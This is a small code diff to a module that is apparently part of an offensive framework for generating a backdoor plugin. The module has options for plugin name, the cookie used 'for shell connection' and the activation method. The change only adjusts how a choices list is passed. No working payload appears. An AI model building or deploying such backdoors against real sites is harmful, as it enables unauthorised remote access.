@@ -15,7 +15,7 @@ class Module(Backdoor):
 
 	plugin_name = OptString("kitty_widget", "Plugin name (will be used as directory name)", True)
 	cookie_name = OptString("kitty_shell", "Cookie name for shell connection", True)
-	method = OptChoice("cookie", "Backdoor activation method", False, ["cookie", "get", "post"])
+	method = OptChoice("cookie", "Backdoor activation method", False, choices=["cookie", "get", "post"])
 
 	def run(self):
 		# Generate plugin directory name
